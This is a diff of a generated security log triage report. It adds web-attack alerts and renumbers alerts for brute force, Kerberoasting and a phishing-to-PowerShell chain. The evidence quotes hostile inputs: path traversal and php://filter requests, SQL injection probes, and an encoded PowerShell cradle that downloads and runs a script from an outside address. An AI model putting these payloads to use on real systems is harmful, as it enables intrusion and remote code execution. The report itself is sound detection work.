@@ -1,12 +1,12 @@
 # Log triage report
 
-Generated from 128 security events in: `sample_logs/audit.log`, `sample_logs/auth.log`, `sample_logs/dc01_security.jsonl`, `sample_logs/sysmon.jsonl`, `sample_logs/windows_security.jsonl`
+Generated from 174 security events in: `sample_logs/audit.log`, `sample_logs/auth.log`, `sample_logs/web_access.log`, `sample_logs/dc01_security.jsonl`, `sample_logs/sysmon.jsonl`, `sample_logs/windows_security.jsonl`
 
 | Severity | Alerts |
 |---|---|
-| critical | 5 |
+| critical | 6 |
 | high | 10 |
-| medium | 8 |
+| medium | 11 |
 | low | 0 |
 
 ## MITRE ATT&CK coverage
@@ -23,10 +23,13 @@ Generated from 128 security events in: `sample_logs/audit.log`, `sample_logs/aut
 | [T1110.001](https://attack.mitre.org/techniques/T1110/001/) | Brute Force: Password Guessing | 3 |
 | [T1110.003](https://attack.mitre.org/techniques/T1110/003/) | Brute Force: Password Spraying | 2 |
 | [T1136.001](https://attack.mitre.org/techniques/T1136/001/) | Create Account: Local Account | 6 |
+| [T1190](https://attack.mitre.org/techniques/T1190/) | Exploit Public-Facing Application | 1 |
 | [T1204.002](https://attack.mitre.org/techniques/T1204/002/) | User Execution: Malicious File | 4 |
 | [T1558.003](https://attack.mitre.org/techniques/T1558/003/) | Steal or Forge Kerberos Tickets: Kerberoasting | 1 |
 | [T1558.004](https://attack.mitre.org/techniques/T1558/004/) | Steal or Forge Kerberos Tickets: AS-REP Roasting | 1 |
 | [T1566.001](https://attack.mitre.org/techniques/T1566/001/) | Phishing: Spearphishing Attachment | 2 |
+| [T1595.002](https://attack.mitre.org/techniques/T1595/002/) | Active Scanning: Vulnerability Scanning | 2 |
+| [T1595.003](https://attack.mitre.org/techniques/T1595/003/) | Active Scanning: Wordlist Scanning | 1 |
 | [T1685.005](https://attack.mitre.org/techniques/T1685/005/) | Disable or Modify Tools: Clear Windows Event Logs | 1 |
 
 ## Alerts
@@ -123,7 +126,26 @@ node=web02 type=USER_MGMT msg=audit(1794282300.000:9134): pid=960 uid=0 auid=0 s
 
 </details>
 
-### 5. [CRITICAL] Newly created account added to privileged group (ACCT-003)
+### 5. [CRITICAL] Path traversal / local file inclusion attempt (WEB-002)
+
+- **Time:** 2026-11-10 08:00:20 to 2026-11-10 08:01:20 UTC (4 events)
+- **Source IP:** `203.0.113.99` (external)
+- **ATT&CK:** T1190 Exploit Public-Facing Application
+
+203.0.113.99 sent 4 request(s) trying to read files outside the web root; 1 got a 200 response with content, so a file may have been disclosed. Check the response size against the real file.
+
+<details><summary>Evidence</summary>
+
+```
+203.0.113.99 - - [10/Nov/2026:08:00:20 +0000] "GET /download.php?file=../../../../etc/passwd HTTP/1.1" 200 1789 "-" "curl/8.5.0"
+203.0.113.99 - - [10/Nov/2026:08:00:40 +0000] "GET /download.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow HTTP/1.1" 403 162 "-" "curl/8.5.0"
+203.0.113.99 - - [10/Nov/2026:08:01:00 +0000] "GET /download.php?file=%252e%252e%252f%252e%252e%252fwindows%252fwin.ini HTTP/1.1" 404 153 "-" "curl/8.5.0"
+203.0.113.99 - - [10/Nov/2026:08:01:20 +0000] "GET /download.php?file=php://filter/convert.base64-encode/resource=config.php HTTP/1.1" 200 0 "-" "curl/8.5.0"
+```
+
+</details>
+
+### 6. [CRITICAL] Newly created account added to privileged group (ACCT-003)
 
 - **Time:** 2026-11-10 09:41:00 to 2026-11-10 09:43:00 UTC (1 events)
 - **Host:** `WS-FIN-07.corp.example`
@@ -141,7 +163,7 @@ node=web02 type=USER_MGMT msg=audit(1794282300.000:9134): pid=960 uid=0 auid=0 s
 
 </details>
 
-### 6. [HIGH] Password spraying from single source (AUTH-002)
+### 7. [HIGH] Password spraying from single source (AUTH-002)
 
 - **Time:** 2026-11-10 04:13:27 to 2026-11-10 04:18:41 UTC (20 events)
 - **Host:** `web01`
@@ -168,7 +190,7 @@ Nov 10 04:18:41 web01 sshd[41329]: Failed password for invalid user support from
 
 </details>
 
-### 7. [HIGH] Executable or script written by Office application (FILE-001)
+### 8. [HIGH] Executable or script written by Office application (FILE-001)
 
 - **Time:** 2026-11-10 09:13:54 to 2026-11-10 09:13:54 UTC (1 events)
 - **Host:** `WS-FIN-07.corp.example`
@@ -181,29 +203,6 @@ winword.exe wrote C:\Users\thandi\AppData\Local\Temp\~invoice.vbs. Hash the file
 
 ```
 {"Channel": "Microsoft-Windows-Sysmon/Operational", "Computer": "WS-FIN-07.corp.example", "EventID": 11, "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "TargetFilename": "C:\\Users\\thandi\\AppData\\Local\\Temp\\~invoice.vbs", "User": "CORP\\thandi", "UtcTime": "2026-11-10 09:13:54.000"}
-```
-
-</details>
-
-### 8. [HIGH] Encoded PowerShell command (EXEC-001)
-
-- **Time:** 2026-11-10 09:14:00 to 2026-11-10 09:14:00 UTC (1 events)
-- **Host:** `WS-FIN-07.corp.example`
-- **User:** `thandi`
-- **ATT&CK:** T1059.001 Command and Scripting Interpreter: PowerShell, T1027 Obfuscated Files or Information
-
-PowerShell started with an encoded command; decoded script contains: downloadstring, iex, net.webclient.
-
-Decoded command:
-
-```powershell
-IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/update.ps1')
-```
-
-<details><summary>Evidence</summary>
-
-```
-{"Channel": "Microsoft-Windows-Sysmon/Operational", "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHUAcABkAGEAdABlAC4AcABzADEAJwApAA==", "Computer": "WS-FIN-07.corp.example", "EventID": 1, "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "User": "CORP\\thandi", "UtcTime": "2026-11-10 09:14:00.000"}
 ```
 
 </details>
@@ -226,24 +225,30 @@ IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/update.ps1')
 <details><summary>Evidence</summary>
 
 ```
-{"CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHUAcABkAGEAdABlAC4AcABzADEAJwApAA==", "Computer": "WS-FIN-07.corp.example", "EventID": 4688, "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "SubjectUserName": "thandi", "TimeCreated": "2026-11-10T09:14:00Z"}
+{"Channel": "Microsoft-Windows-Sysmon/Operational", "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHUAcABkAGEAdABlAC4AcABzADEAJwApAA==", "Computer": "WS-FIN-07.corp.example", "EventID": 1, "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "User": "CORP\\thandi", "UtcTime": "2026-11-10 09:14:00.000"}
 ```
 
 </details>
 
-### 10. [HIGH] Office application spawned a shell or script host (EXEC-002)
+### 10. [HIGH] Encoded PowerShell command (EXEC-001)
 
 - **Time:** 2026-11-10 09:14:00 to 2026-11-10 09:14:00 UTC (1 events)
 - **Host:** `WS-FIN-07.corp.example`
 - **User:** `thandi`
-- **ATT&CK:** T1204.002 User Execution: Malicious File, T1566.001 Phishing: Spearphishing Attachment
+- **ATT&CK:** T1059.001 Command and Scripting Interpreter: PowerShell, T1027 Obfuscated Files or Information
 
-winword.exe started powershell.exe. Documents should not launch interpreters; this is the usual sign of a malicious macro or exploit. Find the document and the email it arrived in.
+PowerShell started with an encoded command; decoded script contains: downloadstring, iex, net.webclient.
+
+Decoded command:
+
+```powershell
+IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/update.ps1')
+```
 
 <details><summary>Evidence</summary>
 
 ```
-{"Channel": "Microsoft-Windows-Sysmon/Operational", "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHUAcABkAGEAdABlAC4AcABzADEAJwApAA==", "Computer": "WS-FIN-07.corp.example", "EventID": 1, "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "User": "CORP\\thandi", "UtcTime": "2026-11-10 09:14:00.000"}
+{"CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHUAcABkAGEAdABlAC4AcABzADEAJwApAA==", "Computer": "WS-FIN-07.corp.example", "EventID": 4688, "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "SubjectUserName": "thandi", "TimeCreated": "2026-11-10T09:14:00Z"}
 ```
 
 </details>
@@ -260,12 +265,29 @@ winword.exe started powershell.exe. Documents should not launch interpreters; th
 <details><summary>Evidence</summary>
 
 ```
+{"Channel": "Microsoft-Windows-Sysmon/Operational", "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHUAcABkAGEAdABlAC4AcABzADEAJwApAA==", "Computer": "WS-FIN-07.corp.example", "EventID": 1, "Hashes": "SHA256=0000000000000000000000000000000000000000000000000000000000000000", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "User": "CORP\\thandi", "UtcTime": "2026-11-10 09:14:00.000"}
+```
+
+</details>
+
+### 12. [HIGH] Office application spawned a shell or script host (EXEC-002)
+
+- **Time:** 2026-11-10 09:14:00 to 2026-11-10 09:14:00 UTC (1 events)
+- **Host:** `WS-FIN-07.corp.example`
+- **User:** `thandi`
+- **ATT&CK:** T1204.002 User Execution: Malicious File, T1566.001 Phishing: Spearphishing Attachment
+
+winword.exe started powershell.exe. Documents should not launch interpreters; this is the usual sign of a malicious macro or exploit. Find the document and the email it arrived in.
+
+<details><summary>Evidence</summary>
+
+```
 {"CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADIAMwAvAHUAcABkAGEAdABlAC4AcABzADEAJwApAA==", "Computer": "WS-FIN-07.corp.example", "EventID": 4688, "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "ParentProcessName": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "SubjectUserName": "thandi", "TimeCreated": "2026-11-10T09:14:00Z"}
 ```
 
 </details>
 
-### 12. [HIGH] Password spraying from single source (AUTH-002)
+### 13. [HIGH] Password spraying from single source (AUTH-002)
 
 - **Time:** 2026-11-10 09:20:00 to 2026-11-10 09:21:03 UTC (8 events)
 - **Host:** `DC01.corp.example`
@@ -289,7 +311,7 @@ winword.exe started powershell.exe. Documents should not launch interpreters; th
 
 </details>
 
-### 13. [HIGH] Kerberos TGT issued without pre-authentication (AS-REP roasting) (KERB-002)
+### 14. [HIGH] Kerberos TGT issued without pre-authentication (AS-REP roasting) (KERB-002)
 
 - **Time:** 2026-11-10 09:24:00 to 2026-11-10 09:24:06 UTC (2 events)
 - **Host:** `DC01.corp.example`
@@ -308,7 +330,7 @@ winword.exe started powershell.exe. Documents should not launch interpreters; th
 
 </details>
 
-### 14. [HIGH] Possible Kerberoasting (KERB-001)
+### 15. [HIGH] Possible Kerberoasting (KERB-001)
 
 - **Time:** 2026-11-10 09:26:00 to 2026-11-10 09:26:09 UTC (4 events)
 - **Host:** `DC01.corp.example`
@@ -329,7 +351,7 @@ thandi requested RC4-encrypted service tickets for 4 service accounts in 10 min.
 
 </details>
 
-### 15. [HIGH] Security event log cleared (EVADE-001)
+### 16. [HIGH] Security event log cleared (EVADE-001)
 
 - **Time:** 2026-11-10 09:55:00 to 2026-11-10 09:55:00 UTC (1 events)
 - **Host:** `WS-FIN-07.corp.example`
@@ -346,7 +368,7 @@ Security log on WS-FIN-07.corp.example was cleared by thandi. Attackers do this 
 
 </details>
 
-### 16. [MEDIUM] Brute force against account(s) (AUTH-001)
+### 17. [MEDIUM] Brute force against account(s) (AUTH-001)
 
 - **Time:** 2026-11-10 02:13:06 to 2026-11-10 02:15:46 UTC (24 events)
 - **Host:** `web01`
@@ -374,7 +396,7 @@ Nov 10 02:15:46 web01 sshd[41243]: Failed password for root from 203.0.113.45 po
 
 </details>
 
-### 17. [MEDIUM] Local account created (ACCT-001)
+### 18. [MEDIUM] Local account created (ACCT-001)
 
 - **Time:** 2026-11-10 02:18:55 to 2026-11-10 02:18:55 UTC (1 events)
 - **Host:** `web01`
@@ -391,7 +413,7 @@ Nov 10 02:18:55 web01 useradd[41301]: new user: name=svc-backup, UID=1003, GID=1
 
 </details>
 
-### 18. [MEDIUM] Brute force against account(s) (AUTH-001)
+### 19. [MEDIUM] Brute force against account(s) (AUTH-001)
 
 - **Time:** 2026-11-10 03:40:00 to 2026-11-10 03:41:18 UTC (14 events)
 - **Host:** `web02`
@@ -419,7 +441,7 @@ node=web02 type=USER_AUTH msg=audit(1794282078.000:9128): pid=813 uid=0 auid=429
 
 </details>
 
-### 19. [MEDIUM] Local account created (ACCT-001)
+### 20. [MEDIUM] Local account created (ACCT-001)
 
 - **Time:** 2026-11-10 03:44:00 to 2026-11-10 03:44:00 UTC (1 events)
 - **Host:** `web02`
@@ -436,7 +458,79 @@ node=web02 type=ADD_USER msg=audit(1794282240.100:9133): pid=950 uid=0 auid=0 se
 
 </details>
 
-### 20. [MEDIUM] Script host connected to external address (NET-001)
+### 21. [MEDIUM] Directory or file brute forcing (many 404s from one source) (WEB-001)
+
+- **Time:** 2026-11-10 07:00:00 to 2026-11-10 07:00:10 UTC (27 events)
+- **Source IP:** `198.51.100.200` (external)
+- **ATT&CK:** T1595.003 Active Scanning: Wordlist Scanning
+
+198.51.100.200 requested 27 paths that do not exist (at least 20 within 5 min). Paths it found: 301 /files, 301 /uploads, 403 /server-status.
+
+<details><summary>Evidence</summary>
+
+```
+198.51.100.200 - - [10/Nov/2026:07:00:00 +0000] "GET /admin HTTP/1.1" 404 153 "-" "gobuster/3.6"
+198.51.100.200 - - [10/Nov/2026:07:00:00 +0000] "GET /backup HTTP/1.1" 404 153 "-" "gobuster/3.6"
+198.51.100.200 - - [10/Nov/2026:07:00:01 +0000] "GET /old HTTP/1.1" 404 153 "-" "gobuster/3.6"
+198.51.100.200 - - [10/Nov/2026:07:00:01 +0000] "GET /test HTTP/1.1" 404 153 "-" "gobuster/3.6"
+198.51.100.200 - - [10/Nov/2026:07:00:02 +0000] "GET /dev HTTP/1.1" 404 153 "-" "gobuster/3.6"
+... 17 more ...
+198.51.100.200 - - [10/Nov/2026:07:00:09 +0000] "GET /panel HTTP/1.1" 404 153 "-" "gobuster/3.6"
+198.51.100.200 - - [10/Nov/2026:07:00:09 +0000] "GET /manager HTTP/1.1" 404 153 "-" "gobuster/3.6"
+198.51.100.200 - - [10/Nov/2026:07:00:09 +0000] "GET /console HTTP/1.1" 404 153 "-" "gobuster/3.6"
+198.51.100.200 - - [10/Nov/2026:07:00:10 +0000] "GET /debug HTTP/1.1" 404 153 "-" "gobuster/3.6"
+198.51.100.200 - - [10/Nov/2026:07:00:10 +0000] "GET /portal HTTP/1.1" 404 153 "-" "gobuster/3.6"
+```
+
+</details>
+
+### 22. [MEDIUM] Vulnerability scanner user agent (WEB-003)
+
+- **Time:** 2026-11-10 07:00:00 to 2026-11-10 07:00:10 UTC (30 events)
+- **Source IP:** `198.51.100.200` (external)
+- **ATT&CK:** T1595.002 Active Scanning: Vulnerability Scanning
+
+198.51.100.200 sent 30 request(s) identifying as gobuster. If this is not an approved scan, block the source and review what else it requested.
+
+<details><summary>Evidence</summary>
+
+```
+198.51.100.200 - - [10/Nov/2026:07:00:00 +0000] "GET /admin HTTP/1.1" 404 153 "-" "gobuster/3.6"
+198.51.100.200 - - [10/Nov/2026:07:00:00 +0000] "GET /backup HTTP/1.1" 404 153 "-" "gobuster/3.6"
+198.51.100.200 - - [10/Nov/2026:07:00:01 +0000] "GET /old HTTP/1.1" 404 153 "-" "gobuster/3.6"
+198.51.100.200 - - [10/Nov/2026:07:00:01 +0000] "GET /test HTTP/1.1" 404 153 "-" "gobuster/3.6"
+198.51.100.200 - - [10/Nov/2026:07:00:02 +0000] "GET /dev HTTP/1.1" 404 153 "-" "gobuster/3.6"
+... 20 more ...
+198.51.100.200 - - [10/Nov/2026:07:00:09 +0000] "GET /manager HTTP/1.1" 404 153 "-" "gobuster/3.6"
+198.51.100.200 - - [10/Nov/2026:07:00:09 +0000] "GET /console HTTP/1.1" 404 153 "-" "gobuster/3.6"
+198.51.100.200 - - [10/Nov/2026:07:00:10 +0000] "GET /debug HTTP/1.1" 404 153 "-" "gobuster/3.6"
+198.51.100.200 - - [10/Nov/2026:07:00:10 +0000] "GET /portal HTTP/1.1" 404 153 "-" "gobuster/3.6"
+198.51.100.200 - - [10/Nov/2026:07:00:10 +0000] "GET /files HTTP/1.1" 301 0 "-" "gobuster/3.6"
+```
+
+</details>
+
+### 23. [MEDIUM] Vulnerability scanner user agent (WEB-003)
+
+- **Time:** 2026-11-10 09:00:00 to 2026-11-10 09:00:08 UTC (5 events)
+- **Source IP:** `203.0.113.150` (external)
+- **ATT&CK:** T1595.002 Active Scanning: Vulnerability Scanning
+
+203.0.113.150 sent 5 request(s) identifying as sqlmap. If this is not an approved scan, block the source and review what else it requested.
+
+<details><summary>Evidence</summary>
+
+```
+203.0.113.150 - - [10/Nov/2026:09:00:00 +0000] "GET /search?id=1 HTTP/1.1" 200 3100 "-" "sqlmap/1.8.11#stable (https://sqlmap.org)"
+203.0.113.150 - - [10/Nov/2026:09:00:02 +0000] "GET /search?id=1%27 HTTP/1.1" 500 3101 "-" "sqlmap/1.8.11#stable (https://sqlmap.org)"
+203.0.113.150 - - [10/Nov/2026:09:00:04 +0000] "GET /search?id=1%20AND%201%3D1 HTTP/1.1" 200 3102 "-" "sqlmap/1.8.11#stable (https://sqlmap.org)"
+203.0.113.150 - - [10/Nov/2026:09:00:06 +0000] "GET /search?id=1%20AND%201%3D2 HTTP/1.1" 500 3103 "-" "sqlmap/1.8.11#stable (https://sqlmap.org)"
+203.0.113.150 - - [10/Nov/2026:09:00:08 +0000] "GET /search?id=1%27%20OR%20%271%27%3D%271 HTTP/1.1" 200 3104 "-" "sqlmap/1.8.11#stable (https://sqlmap.org)"
+```
+
+</details>
+
+### 24. [MEDIUM] Script host connected to external address (NET-001)
 
 - **Time:** 2026-11-10 09:14:06 to 2026-11-10 09:14:18 UTC (3 events)
 - **Host:** `WS-FIN-07.corp.example`
@@ -455,7 +549,7 @@ powershell.exe on WS-FIN-07.corp.example connected to 198.51.100.23:80 3 time(s)
 
 </details>
 
-### 21. [MEDIUM] Executable or script written by script host (FILE-001)
+### 25. [MEDIUM] Executable or script written by script host (FILE-001)
 
 - **Time:** 2026-11-10 09:14:30 to 2026-11-10 09:14:30 UTC (1 events)
 - **Host:** `WS-FIN-07.corp.example`
@@ -472,7 +566,7 @@ powershell.exe wrote C:\Users\thandi\AppData\Local\Temp\update.exe. Hash the fil
 
 </details>
 
-### 22. [MEDIUM] Brute force against account(s) (AUTH-001)
+### 26. [MEDIUM] Brute force against account(s) (AUTH-001)
 
 - **Time:** 2026-11-10 09:30:00 to 2026-11-10 09:32:48 UTC (15 events)
 - **Host:** `JUMP01.corp.example`
@@ -500,7 +594,7 @@ powershell.exe wrote C:\Users\thandi\AppData\Local\Temp\update.exe. Hash the fil
 
 </details>
 
-### 23. [MEDIUM] Local account created (ACCT-001)
+### 27. [MEDIUM] Local account created (ACCT-001)
 
 - **Time:** 2026-11-10 09:41:00 to 2026-11-10 09:41:00 UTC (1 events)
 - **Host:** `WS-FIN-07.corp.example`
